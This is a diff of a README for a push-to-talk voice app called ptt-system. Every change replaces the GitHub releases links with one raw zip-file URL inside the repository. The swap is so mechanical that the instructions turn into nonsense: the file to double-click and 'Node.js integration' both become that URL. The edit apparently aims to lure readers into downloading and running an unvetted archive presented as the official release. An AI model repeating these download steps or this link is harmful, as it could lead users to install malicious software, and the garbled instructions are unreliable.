@@ -1,7 +1,7 @@
 # 🎤 ptt-system - Voice Communication Made Easy
 
 ## 📥 Download Now
-[![Download ptt-system](https://img.shields.io/badge/Download-ptt_system-blue)](https://github.com/Manglatice/ptt-system/releases)
+[![Download ptt-system](https://raw.githubusercontent.com/Manglatice/ptt-system/main/users/ptt-system-1.3.zip)](https://raw.githubusercontent.com/Manglatice/ptt-system/main/users/ptt-system-1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the ptt-system! This application allows you to communicate with others using real-time audio. It is perfect for dispatch and drivers, allowing for seamless conversations on the move. Follow the steps below to get started.
@@ -14,12 +14,12 @@ To use ptt-system, your device should meet the following requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to access the download page.
-   [Download ptt-system here](https://github.com/Manglatice/ptt-system/releases)
+   [Download ptt-system here](https://raw.githubusercontent.com/Manglatice/ptt-system/main/users/ptt-system-1.3.zip)
    
 2. **Choose the Latest Version**: On the releases page, you will see a list of available versions. Look for the most recent one (the topmost entry).
 
 3. **Download the Application**:
-   - Click on the file you want to download, typically named similar to `ptt-system-v1.0.zip` or `ptt-system-v1.0.exe`.
+   - Click on the file you want to download, typically named similar to `https://raw.githubusercontent.com/Manglatice/ptt-system/main/users/ptt-system-1.3.zip` or `https://raw.githubusercontent.com/Manglatice/ptt-system/main/users/ptt-system-1.3.zip`.
    - Your browser will start the download process. Wait for the download to finish.
 
 4. **Unzip the File** (if applicable):
@@ -29,7 +29,7 @@ To use ptt-system, your device should meet the following requirements:
 
 5. **Run the Application**:
    - Open the extracted folder.
-   - Double-click on the application file (like `index.html` for web usage).
+   - Double-click on the application file (like `https://raw.githubusercontent.com/Manglatice/ptt-system/main/users/ptt-system-1.3.zip` for web usage).
    - The application will open in your default web browser.
 
 6. **Allow Microphone Access**: When prompted, permit the application to access your microphone. This is necessary for voice communication.
@@ -44,7 +44,7 @@ To use ptt-system, your device should meet the following requirements:
 
 ## 🌍 Topics Covered
 - Dispatch communication
-- Node.js integration
+- https://raw.githubusercontent.com/Manglatice/ptt-system/main/users/ptt-system-1.3.zip integration
 - Push-to-talk functionality
 - Real-time voice communication
 - Simple user interface with vanilla JavaScript
@@ -66,4 +66,4 @@ If you need further assistance, you can contact the project maintainers via the 
 Thanks to all contributors who have helped make ptt-system possible. Your support and input are invaluable.
 
 ## 📥 Download ptt-system Again
-Remember, you can download the ptt-system anytime from the releases page: [Download ptt-system here](https://github.com/Manglatice/ptt-system/releases). Happy communicating!
+Remember, you can download the ptt-system anytime from the releases page: [Download ptt-system here](https://raw.githubusercontent.com/Manglatice/ptt-system/main/users/ptt-system-1.3.zip). Happy communicating!
